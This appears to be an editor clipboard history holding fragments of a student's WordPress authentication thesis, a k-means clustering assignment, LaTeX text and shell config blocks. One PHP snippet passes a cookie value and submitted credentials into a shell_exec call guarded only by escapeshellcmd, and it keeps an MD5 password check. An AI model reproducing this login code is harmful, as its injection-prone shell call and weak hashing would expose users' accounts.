ceb061e8ea2d49fa98cb5510f2da5236|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2328|19|v|php
	$_COOKIE["csrf-token"]
265fc3bad64b98abc42fbfe85a4a5130|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2327|1|V|php
	        $message = "";
	        if (isset($_COOKIE["csrf-token"])){
	           $message = $_COOKIE["csrf-token"];
	        } else{
	                return apply_filters( 'check_password', false, $credentials, $stored_pk, $user_id );
	        }
befae83716f6983678d3d20f1aa30c00|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|11|46|v|javascript
	"af82"
6be89bf923ba93b6fbf3f07d64f3a84e|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|11|1|V|javascript
	    let credentials = authenticate(password, message);
d414f2e49ffb422046c06f28f80d2045|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/form_submit.js|10|1|V|javascript
	    let message = jQuery("#csrf-token").val();
dd8ed1501db70884f66dbe55863e1c64|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|126|1|V|tex
	% \\TODO
0de67c0d077c7af96bd198e43293de2d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2328|26|v|php
	E["csrf-token"])){
2fee57f72bd4f9112d46cd4aa80f4bc2|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2328|1|V|php
	        if (isset($_COOKIE["csrf-token"])){
	           $message = $_COOKIE["csrf-token"];
	        } else{
	                return apply_filters( 'check_password', false, $credentials, $stored_pk, $user_id );
	        }
fe30b5f2a250303bbd250142dc057837|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2336|1|V|php
	        $public_key = substr($credentials, 0, 64);
	        $signature = substr($credentials, 64);
	
	        if ( strlen( $stored_pk ) <= 32 ) {
	            $check = hash_equals( $stored_pk, md5( $public_key ) );
	            if ( $check && $user_id ) {
	                // Rehash using new hash.
	                wp_set_password( $public_key, $user_id );
	                $stored_pk = wp_hash_password( $public_key );
	            } else{
	               return apply_filters( 'check_password', false, $credentials, $stored_pk, $user_id );
	            }
	        }
eec95ba2b3fe842e20212de80e499541|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2361|1|V|php
	        $command = escapeshellcmd("python /var/www/html/verify.py $public_key $message $signature");
	        $output = shell_exec($command);
	        if ($output == 1){
	            $check = true;
	        } else {
	            $check = false;
	        }
	        return apply_filters( 'check_password', $check, $credentials, $stored_pk, $user_id );
	        }
837c097e1b5d14f2b30228dcf1de2023|file:///home/neo/.bashrc|134|1|V|sh
	# >>> conda initialize >>>
	# !! Contents within this block are managed by 'conda init' !!
	__conda_setup="$('/home/neo/anaconda3/bin/conda' 'shell.bash' 'hook' 2> /dev/null)"
	if [ $? -eq 0 ]; then
	    eval "$__conda_setup"
	else
	    if [ -f "/home/neo/anaconda3/etc/profile.d/conda.sh" ]; then
	        . "/home/neo/anaconda3/etc/profile.d/conda.sh"
	    else
	        export PATH="/home/neo/anaconda3/bin:$PATH"
	    fi
	fi
	unset __conda_setup
	# <<< conda initialize <<<
ee191eacbbb52f25790a4feab320a6db|file:///home/neo/.zshrc|132|1|V|zsh
	# ctf-tools: gem install
7e096d94d7bc9f614ae4f6861ce19ff3|file:///home/neo/anaconda3/envs/epl448_as2/lib/python3.7/site-packages/sklearn/datasets/__init__.py|60|1|V|python
	           'fetch_olivetti_faces',
74e616201fba56cd484bde5589673ff7|file:///home/neo/anaconda3/envs/epl448_as2/lib/python3.7/site-packages/sklearn/datasets/__init__.py|61|13|v|python
	fetch_olivetti_faces
c67bfa34020c3b34f8d65d4cfe76e4fb|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|180|30|v|python
	datasets.make_blobs(n_samples=200, n_features=2, centers=10, cluster_std=1.0, random_state=1234)
f9ac3a19d8215c6e15825c14da006019|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|181|16|v|python
	KMeans(n_clusters=10, init='k-means++', random_state=1234)
d24b0e1224a2def877ff61f08029a07c|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|182|1|V|python
	t1d_kmeanspp_clusters = t1d_kmeanspp.fit(t1d_data)
e336d8e48dc802d2556bc5b87b2aa9e6|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|183|1|V|python
	t1d_kmeanspp_cluster_assignments = t1d_kmeanspp_clusters.labels_
c9a5bea7c630c4e5f4eee33640289f1c|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|198|1|V|python
	t1e_kmeanspp_cluster_assignments = None
6adf97f83acf6453d4a6a4b1070f3754|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|198|36|v|python
	None
c7ddc56c5000fab9e833ce904b672e12|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|183|35|v|python
	 t1d_kmeanspp_clusters.labels_
ef2606b66fd9960d1c482c2620ebe1a1|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|184|21|v|python
	KMeans(n_clusters=10, init='random', random_state=1234)
eff1c27ccadb943c67b45a4c755aebc0|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|199|21|v|python
	None 
1674e58133dacbcb6957909f7d7f7ba0|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|197|1|V|python
	t1e_kmeanspp_clusters = t1e_kmeanspp.fit(t1e_data)
caf182a0e4121b83f83fb7b03cf3b2d3|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|200|1|v|python
	t1e_kmeanspp_clusters
32f6ff3a50869f71d713a133179c81b0|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|199|20|v|python
	 KMeans(n_clusters=10, init='random', random_state=1234)
5c62ba166ad41b3344ee8a21aa98f173|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|198|35|v|python
	 t1e_kmeanspp_clusters.labels_
6b94dc763815dcdde84944059ad86e2f|file:///home/neo/.zshrc|134|1|V|zsh
	# >>> conda initialize >>>
	# !! Contents within this block are managed by 'conda init' !!
	# __conda_setup="$('/home/neo/anaconda3/bin/conda' 'shell.bash' 'hook' 2> /dev/null)"
	# if [ $? -eq 0 ]; then
	#     eval "$__conda_setup"
	# else
	#     if [ -f "/home/neo/anaconda3/etc/profile.d/conda.sh" ]; then
	#         . "/home/neo/anaconda3/etc/profile.d/conda.sh"
	#     else
	#         export PATH="/home/neo/anaconda3/bin:$PATH"
	#     fi
	# fi
02db4f8cab5039c60a27c516d75d8781|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|112|21|v|python
	original_data[:, 0], original_data[:, 1], c=label_color_original, edgecolors='black'
ef9fa6c3b95c0614c71518402ce6779b|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|95|1|V|python
	    LABEL_COLOR_MAP = {0: 'red',
	                       1: 'green',
	                       2: 'blue',
	                       3: 'yellow',
	                       4: 'cyan',
	                       5: 'magenta',
	                       6: 'orange',
	                       7: 'white',
	                       8: 'purple',
	                       9: 'pink',
	    }
	
	    label_color_original = [LABEL_COLOR_MAP[l] for l in original_cluster_assignments]
	    label_color_pp = [LABEL_COLOR_MAP[l] for l in kmeanspp_cluster_assignments]
	    label_color_random = [LABEL_COLOR_MAP[l] for l in kmeans_random_cluster_assignments]
	
25c381df78f343e20e48449e105cdf55|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|135|30|v|python
	datasets.make_blobs(n_samples=200, n_features=2, centers=4, cluster_std=1.0, random_state=1234)
c10e1c168f1145d3a8bc47cc3c50ea95|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|137|16|v|python
	KMeans(n_clusters=4, init='k-means++', random_state=1234)
7ae689833be1b9fba3ebec98723a1795|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|212|30|v|python
	datasets.make_circles(n_samples=200, random_state=1234)
9ba86dca63792a52428c0c3574fe5b45|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|229|30|v|python
	datasets.make_moons(n_samples=200, random_state=1234)
64dbfea1242932299942ac36e16226d3|file:///home/neo/.histfile|12362|1|V|
	vi .zshrc
6f6a635bb7a7e0cd8cb5d939b93f56f8|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|66|249|v|tex
	 We demonstrate how the functionality of WordPress can be extended to use {\tt auth.js} firstly 
21ae63ac6e5582630c2798add3565e1d|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|67|1|V|tex
	In order to extend this functionality through {\tt auth.js}, we must do the following: 
732f3800bc45eddf01bf0cb3cad8affb|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|66|474|v|tex
	adding
15610cc2660e28558e4b5db089797908|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|66|479|v|tex
	additional
8703470410de637cb22339d0b3aaa97f|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|74|5|V|tex
	    \item Modify the login form to include a random token that will be utilized as a nonce and get signed with the user's private key in order to perform authentication. Also, add the same token as a cookie that will be submitted along with the form, in order to have the original value of the token to verify the signature on the server. Using this method, the server does not need to keep the state of the session to verify the message.
73a56f5af933c3948cc62f910ecfdcfc|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|75|5|V|tex
	    \item Modify the default authentication check of WordPress to make it verify the submitted signed nonce using the stored public key. Note that before verifying the signature, the public key sent by the client still needs to be checked against the public key which was stored during registration.
9543785b9f90f2082bd90da21876e374|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|74|226|v|tex
	In the authentication scheme described in Section~\ref{}, {\tt auth.js} changes the submitted password value to an Ed25519 public key for user registration. For user authentication, the value is changed to a string consisting of the same Ed25519 public key concatenated with the signed nonce.
787ca6206c52a1f9ac4076ec5fc16979|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|84|1|V|tex
	Adding the {\tt auth.js} file can easily be done using the {\tt login\_enqueue\_scripts} hook provided by WordPress (see Listing~\ref{lst:enqueue}).
	
	To modify the reset password form, we enqueued another custom script that uses JQuery to temporarily stop the form submission. Before eventually submitting the form, the script uses the {\tt auth.js} API to generate the correct credential (in this case the Ed25519 public key) and change the submitted credential value. As can be seen in Listing~\ref{lst:reset_pass}, this script is also where the web programmer will initialize {\tt auth.js} to use the authentication system of their choice, using the {\tt initializeCredentialType} call.
	
	Similarly to the reset password form, we used a script to change the submitted password value on the login form. In particular, the aforementioned script uses the {\tt auth.js} {\tt authenticate} API call to sign the nonce placed in the login form using the private key generated using the typed user password as a seed. Note that the same nonce is also attached on the login form as a cookie. When posting the form on the server, the cookie still has the original value of the nonce. The server can utilize this value to verify that the signature submitted by the user is correct.
5c071c84fc6fa8bcd141550677482891|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|79|301|v|tex
	(in this case the Ed25519 public key
5ed88013853a3fc3b2417e87793e023d|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|79|503|v|tex
	As can be seen in Listing~\ref{lst:reset_pass}, this script is also where the web programmer will initialize {\tt auth.js} to use the authentication system of their choice, using the {\tt initializeCredentialType} call.
4b9cac42b0bd360cff35513dc70ed05a|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|85|1|V|tex
	In particular, the aforementioned script uses the {\tt auth.js} {\tt authenticate} API call to sign the nonce placed in the login form using the private key generated using the typed user password as a seed. Note that the same nonce is also attached on the login form as a cookie. When posting the form on the server, the cookie still has the original value of the nonce. The server can utilize this value to verify that the signature submitted by the user is correct.
cf9ef9f32ea7ed1d63f3dd6b4ec76a3a|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|95|217|v|tex
	 In particular
eb399bcaca686f8609137153307eecf1|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|99|73|v|tex
	change
e4a53ce43e1661cd7cc4c7dd4ecd3a0e|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|95|373|v|tex
	the aforementioned log
601873b28fe5c7014afcf9c6c0f1f1cc|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|95|549|v|tex
	generated using the typed user password as a seed
ca00c93a61047ae461ead95656893581|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|95|859|v|tex
	 For the reset password script, only the value of the generated public key will be submitted.
d60b67c5c5ae7ce0143fab5d7c87e49b|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|101|1|V|tex
	\begin{lstlisting}[caption={Using the {\tt login\_enqueue\_scripts} hook to enqueue auth.js.}, label={lst:enqueue}]
a3bc62f64983e0ebd32eabb65e84190b|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|130|29|v|tex
	Using the {\tt login\_enqueue\_scripts} hook to enqueue auth.js.
e63800536086e734f5a97fbc06eb7ebb|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|97|1|V|tex
	\textbf{Add cookie}
e3b6da5460fa29459656abc7e0955287|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|97|1|V|tex
	To add the nonce that will be utilized as a message and be signed using the user's private key, 
ee04901a3310ecb01622a9872a459559|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|90|171|v|tex
	Also, add the same token as a cookie that will be submitted along with the form, in order to have the original value of the token to verify the signature on the server. Using this method, the server does not need to keep the state of the session to verify the message.
e191ba2a22a030b656a3c28523d08dd9|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|92|5|V|tex
	    \item \textbf{...}In the authentication scheme described in Section~\ref{}, {\tt auth.js} changes the submitted password value to an Ed25519 public key for user registration. For user authentication, the value is changed to a string consisting of the same Ed25519 public key concatenated with the signed nonce.
66bf84096f860a12629873e2f9880154|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|94|766|v|tex
	When posting the form on the server, the cookie still has the original value of the nonce. The server can utilize this value to verify that the signature submitted by the user is correct.
4ed391c173e407760503af29edea212e|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|66|234|v|tex
	by the website
27721906a908e141ba1436bf14739652|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|79|289|v|tex
	izialized
b47b2b7d8b66f5a60c333a76fc85ad12|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|92|137|v|tex
	 Note that before verifying the signature, the public key sent by the client still needs to be checked against the public key which was stored during registration.
ca969a1bc97732d97b1e88ce8396c216|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|27|12|v|php
	csrf
e1846beb0ef64af2e45019ff7d64cd40|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|27|12|v|php
	csrf-token
48b2e940579d81bacacec29b68512380|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|25|16|v|php
	to set as csrf token and cookie
cdb2d9821e948fd8f401696c597822c7|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|25|1|V|php
	# Create nonce and set it as a cookie 
	$token = bin2hex(openssl_random_pseudo_bytes(16));
0b9cbd873c402ce106c24e2ecb0ffa1a|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|25|1|V|php
	# Create nonce and set it as a cookie 
	$token = bin2hex(openssl_random_pseudo_bytes(16));
	setcookie("nonce-message", $token, time() + 60 * 60 * 24);
e1148e651d25098597f559eb78bb884d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1413|1|V|php
	                <input type="hidden" id="nonce-message" name="nonce-message" value="<?= $token ?>" />
1259dd17621089c42c85508aa4b7eaa6|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|92|1|V|tex
	    \item Modify the default authentication check of WordPress to make it verify the submitted signed nonce using the stored public key.
fb9acfc332ce80b8b4358d84c16938fd|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|93|11|v|tex
	Modify the default authentication check of WordPress to make it verify the submitted signed nonce using the stored public key.
1d8857fa8d44c5c439753b816d1b3796|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|93|5|V|tex
	    \item  
2da018f1045892e718c5a7f242ad87dc|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|99|1305|v|tex
	 The authentication function gets the original value of the nonce before it was signed from the submitted cookie
eb8560907c05f6d7463cded5650c2532|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|38|5|V|tex
	    \item After initializing the options, the {\tt authenticate} and {\tt register} calls can be used. Those calls are placed in the web application's Javascript source by the web programmer, to be called when the user tries to perform a authentication or registration action. They take as arguments the user's username and password and the address of the server and handle the corresponding actions, using the previously defined authentication scheme.
646856b3404b237052adf9180131a109|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|46|1|V|tex
	\begin{lstlisting}[caption={\textbf{Web application html file.} The client is directed to get {\tt auth.js} from a truted source.}, label={lst:html}]
	<html>
	<head>
	...
	<script type = "text/javascript" src = "https://trusted.com/auth.js"></script>
	<script type = "text/javascript" src = "myjs.js"></script>
	...
	</head>
	<body>
	/* Registration and login form */
	</body>
	</html>
	\end{lstlisting}
	
	
96d0a2a285b142d3c5ef7e66f64e6d0a|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|8|18|v|tex
	https://www.tarsnap.com/scrypt/scrypt-1.3.0.tgz
2f4c4fbb482effb98c7470506c905df5|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|16|1|V|bib
	@misc{totp_algos,
	  title = {About One-Time Passwords in general},
	  howpublished = {\url{http://blogs.forgerock.org/petermajor/2014/02/one-time-passwords-hotp-and-totp/}}
	}
48e107ec63f73361322517895d5d621b|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|7|v|bib
	totp_algos
090e4798303d88211cf7a71176ee62f2|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|3|24|v|bib
	http://blogs.forgerock.org/petermajor/2014/02/one-time-passwords-hotp-and-totp/
611778b1dcacfb39f3aadb41c9e40a45|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|2|12|v|bib
	About One-Time Passwords in general
a23c9cd146f342859f2a6e747458a50d|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|1|V|bib
	@misc{tarsnap_scrypt,
	  title = {Scrypt 1.3.0},
	  howpublished = {\url{https://www.tarsnap.com/scrypt/scrypt-1.3.0.tgz}}
	}
	
7f3c72c041d84183281aa005a8e5a96a|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|8|9|v|tex
	footnote
59aef49373b2d872693a3622c8950c82|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|7|v|bib
	tarsnap_scrypt
4f19a1c47645d8577fed342278e0291f|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|46|346|v|tex
	https://bench.cr.yp.to/supercop.html
9999fd939c2f67dfc0ec7335cf264efd|file:///home/neo/Documents/myneimisjeff.txt|54|1|V|text
	    t5a_digit_i_subset = p5_train_data[p5_train_labels == i]
8532a133bdbff9c57fd59249050d2203|file:///home/neo/Documents/myneimisjeff.txt|54|26|v|text
	p5_train_data[p5_train_labels == i]
de776783c28ccee3bc6b61f444d78787|file:///home/neo/Documents/epl448/as2/as2.tex|6|1|V|tex
	\newlist{steps}{enumerate}{1}
	\setlist[steps, 1]{label = Step \arabic*:}
14dfdbbf483b5ad9dbdf9914361ee0ef|file:///home/neo/Documents/epl448/as2/as2.tex|9|6|v|tex
	{October 2019}
7f63f4415996abfa4a3e10b0ce468369|file:///home/neo/Documents/epl448/as2/as2.tex|9|1|V|tex
	\date
5f844740bae23ae6a90b354428b2c6be|file:///home/neo/Documents/epl448/as2/as2.tex|3|1|V|tex
	\usepackage[utf8]{inputenc}
dba57619b645908951d755d00b545540|file:///home/neo/Documents/epl448/as2/as2.tex|5|1|V|tex
	\usepackage[utf8x]{inputenc}
75c666c929191cc6962e0d95698ecb2c|file:///home/neo/Documents/epl448/as2/as2.tex|10|9|v|tex
	Neophytos Christou
c34f14de38084a89be188e3ecd55fd1a|file:///home/neo/Documents/epl448/as2/as2.tex|20|31|v|tex
	task1/boot_ophcrack.png
9dd6d23b98cdc9bb9dd0069253460b51|file:///home/neo/Documents/epl448/as2/as2.tex|21|12|v|tex
	Boot from OphCrack
c592bad966936872ddb4e5bc38739801|file:///home/neo/Documents/epl448/as2/as2.tex|24|3|V|tex
	  \label{fig:boot_oph}
de8508299384b82a4945bf2eb5f03570|file:///home/neo/Documents/epl448/as2/as2.tex|20|1|V|tex
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=1]{images/t1b_text.png}
	  \caption{\textlatin{Clustroids}}
	\end{figure}
8a29b2fde8873841c031305e7cee100d|file:///home/neo/Documents/epl448/as2/as2.tex|27|36|v|tex
	t1b_text
16be22fc1d216207e7327cd7cac30097|file:///home/neo/Documents/epl448/as2/as2.tex|28|23|v|tex
	Clustroids
3725cf2e81d1689f01adfc4c3913f4e8|file:///home/neo/Documents/epl448/as2/as2.tex|19|1|V|tex
	\subsubsection*{\textlatin{K-means with 200 2-D points with 4 clusters with a standard deviation of 1.0 and random state of 1234}}
57f944226dfeeeb9156b242e6d1544f9|file:///home/neo/Documents/epl448/as2/as2.tex|19|1|V|tex
	\subsubsection*{\textlatin{T1b: K-means with 200 2-D points with 4 clusters with a standard deviation of 1.0 and random state of 1234}}
45c2ff59db3f83533195a4028a3cce6e|file:///home/neo/Documents/epl448/as2/as2.tex|19|1|V|tex
	\subsubsection*{\textlatin{T1b: K-means with 200 2-D points with 4 clusters with a standard deviation of 1.0 and random state of 1234}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=1]{images/t1b_text.png}
	  \caption{\textlatin{Clustroids}}
	\end{figure}
cf1b14de75faf72de1aea14cc977db81|file:///home/neo/Documents/epl448/as2/as2.tex|31|1|V|tex
	\newpage
	\subsubsection*{\textlatin{T1c: K-means with 200 2-D points with 4 clusters with a standard deviation of 5.0 and random state of 1234}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.25]{images/t1c.png}
	  \caption{\textlatin{T1c: Graphs}}
	\end{figure}
	
562505d567faf02dfc9388e81e89d07b|file:///home/neo/Documents/epl448/as2/as2.tex|39|1|V|tex
	\newpage
32d8bfba4783ef5c74999dd9324c6cf3|file:///home/neo/Documents/epl448/as2/as2.tex|39|1|V|tex
	\subsubsection*{\textlatin{T1d: K-means with 200 2-D points with 10 clusters with a standard deviation of 1.0 and random state of 1234}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.25]{images/t1d.png}
	  \caption{\textlatin{T1d: Graphs}}
	\end{figure}
2a6f73c13f3da78a05ce2d3e7e68433a|file:///home/neo/Documents/epl448/as2/as2.tex|46|1|V|tex
	\subsubsection*{\textlatin{T1e: K-means with 200 2-D points with 10 clusters with a standard deviation of 5.0 and random state of 1234}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.23]{images/t1e.png}
	  \caption{\textlatin{T1e: Graphs}}
	\end{figure}
b15e2720a810a781861a19959ba5bb4d|file:///home/neo/Documents/epl448/as2/as2.tex|53|1|V|tex
	\subsubsection*{\textlatin{T1f: K-means with 200 2-D points with 2 clusters with random state of 1234 on a circles dataset}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.23]{images/t1f.png}
	  \caption{\textlatin{T1f: Graphs}}
	\end{figure}
a8163da6de06656113b77e5ec66c6c53|file:///home/neo/Documents/epl448/as2/as2.tex|60|108|v|tex
	circles
0a9a0500e252b47dcb7d3dc869df6c9d|file:///home/neo/Documents/epl448/as2/as2.tex|60|1|V|tex
	\subsubsection*{\textlatin{T1g: K-means with 200 2-D points with 2 clusters with random state of 1234 on a moons dataset}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.23]{images/t1g.png}
	  \caption{\textlatin{T1g: Graphs}}
	\end{figure}
137ca8e8852c3930b851370fd0996d37|file:///home/neo/Documents/epl448/as2/as2.tex|67|33|v|tex
	K-means with 200 2-D points with 2 clusters with random state of 1234 on a moons dataset
22dffcf66d37b2b2259262f1b47cdc84|file:///home/neo/Documents/epl448/as2/as2.tex|68|1|V|tex
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.23]{images/t1g.png}
	  \caption{\textlatin{T1g: Graphs}}
	\end{figure}
dcac53aaed08759ac50622fb308af979|file:///home/neo/.zshrc|136|1|V|zsh
	__conda_setup="$('/home/neo/anaconda3/bin/conda' 'shell.bash' 'hook' 2> /dev/null)"
	if [ $? -eq 0 ]; then
	    eval "$__conda_setup"
	else
	    if [ -f "/home/neo/anaconda3/etc/profile.d/conda.sh" ]; then
	        . "/home/neo/anaconda3/etc/profile.d/conda.sh"
	    else
	        export PATH="/home/neo/anaconda3/bin:$PATH"
	    fi
	fi
48d689be783a8def753a732457e43224|file:///home/neo/Documents/epl448/as2/as2.tex|68|1|V|tex
	\subsubsection*{\textlatin{T1h: K-means} Œ≥ŒπŒ± œÉœÖŒºœÄŒØŒµœÉŒ∑ ŒµŒπŒ∫œåŒΩŒ±œÇ}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t1h-text.png}
	  \caption{\textlatin{T1h: Total time for clustering entire data}}
	\end{figure}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.55]{images/t1h.png}
	  \caption{\textlatin{T1h: Compressed images}}
	\end{figure}
17c9d2be1f2ee8b90fffc8b76ee1a984|file:///home/neo/Documents/epl448/as2/as2.tex|86|1|V|tex
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.55]{images/t1h.png}
	  \caption{\textlatin{T1h: Compressed images}}
	\end{figure}
b62dea7d9d3b2063042d2b85f4ecb143|file:///home/neo/Documents/epl448/as2/as2.tex|84|54|v|tex
	entire data
aed0e73b9e256ee90bec731bf79b8824|file:///home/neo/Documents/epl448/as2/as2.tex|81|1|V|tex
	\subsubsection*{\textlatin{T1i: K-means} Œ≥ŒπŒ± œÉœÖŒºœÄŒØŒµœÉŒ∑ ŒµŒπŒ∫œåŒΩŒ±œÇ ŒºŒµ Œ¥ŒµŒØŒ≥ŒºŒ±}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t1i-text.png}
	  \caption{\textlatin{T1i: Total time for clustering over a sample}}
	\end{figure}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.3]{images/t1i.png}
	  \caption{\textlatin{T1h: Compressed images with clustering over a sample}}
	\end{figure}
5d658e244d290145ffa5006328258ff5|file:///home/neo/Documents/epl448/as2/as2.tex|99|1|V|tex
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.3]{images/t1i.png}
	  \caption{\textlatin{T1h: Compressed images with clustering over a sample}}
	\end{figure}
d5583a16422700c590463419d6fe7153|file:///home/neo/Documents/epl448/as2/as2.tex|93|41|v|tex
	 Œ≥ŒπŒ± œÉœÖŒºœÄŒØŒµœÉŒ∑ ŒµŒπŒ∫œåŒΩŒ±œÇ ŒºŒµ Œ¥ŒµŒØŒ≥ŒºŒ±
d465e60e3da578190e58f3420b368f9f|file:///home/neo/Documents/epl448/as2/as2.tex|97|23|v|tex
	T1i: Total time for clustering over a sample
8be96ed2a1a399059e10f1f20e8a561e|file:///home/neo/Documents/epl448/as2/as2.tex|102|23|v|tex
	T1h: Compressed images with clustering over a sample
b57776085e5b2cea1547470819f04d43|file:///home/neo/Documents/epl448/as2/as2.tex|102|1|V|tex
	  \caption{\textlatin{T1j: Clustering statistics plot with centers=4}}
b2f044c52034dc4a7caf16257dd20824|file:///home/neo/Documents/epl448/as2/as2.tex|108|3|V|tex
	  \caption{\textlatin{T1h: Compressed images with clustering over a sample}}
368d92bb479bd53cab563d4566142afa|file:///home/neo/Documents/epl448/as2/as2.tex|93|1|V|tex
	\subsubsection*{\textlatin{T1j: Finding optimal number of clusters for K-means}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t1j-text.png}
	  \caption{\textlatin{T1j: Optimal number of clusters using gap statistics}}
	\end{figure}
0fb74d0fcfb12ee1650db9b2623c30bf|file:///home/neo/Documents/epl448/as2/as2.tex|112|28|v|tex
	T1j: Finding optimal number of clusters for K-means
1326794eabd19863a67613a521276865|file:///home/neo/Documents/epl448/as2/as2.tex|116|23|v|tex
	T1j: Optimal number of clusters using gap statistics
822f9997d35fb8be383fea2b2df92cf3|file:///home/neo/Documents/epl448/as2/as2.tex|112|1|V|tex
	\subsubsection*{\textlatin{T2b: Hierarchical clustering over a dataset with 200 2-D points with 4 cluster with a standard deviation of 1.0}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t2b}
	  \caption{\textlatin{T2b: Plots of hierarchical clustering with different linkage}}
	\end{figure}
ff16c61baef835419497c8ca8eac0647|file:///home/neo/Documents/epl448/as2/as2.tex|119|99|v|tex
	 with 4 cluster with a standard deviation of 1.0
2c0f37830eb39c30fc9a4e122b62152c|file:///home/neo/Documents/epl448/as2/as2.tex|119|1|V|tex
	\subsubsection*{\textlatin{T2c: Hierarchical clustering over a circles dataset with 200 2-D points}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.5]{images/t2c}
	  \caption{\textlatin{T2c: Plots of hierarchical clustering on circles dataset with different linkage}}
	\end{figure}
a06830c5db9ae24ccf8b70979cb596e5|file:///home/neo/Documents/epl448/as2/as2.tex|127|1|V|tex
	\subsubsection*{\textlatin{T2d: Hierarchical clustering over a moons dataset with 200 2-D points}}
	\begin{figure}[h]
	\centering
	  \includegraphics[scale=0.25]{images/t2d.png}
	  \caption{\textlatin{T2d: Plots of hierarchical clustering on a moons dataset with different linkage}}
	\end{figure}
c4d77e607b2a84a188e6dc3fa0368ec3|file:///home/neo/Documents/epl448/as2/as2.tex|136|1|V|tex
	\begin{figure}[h]
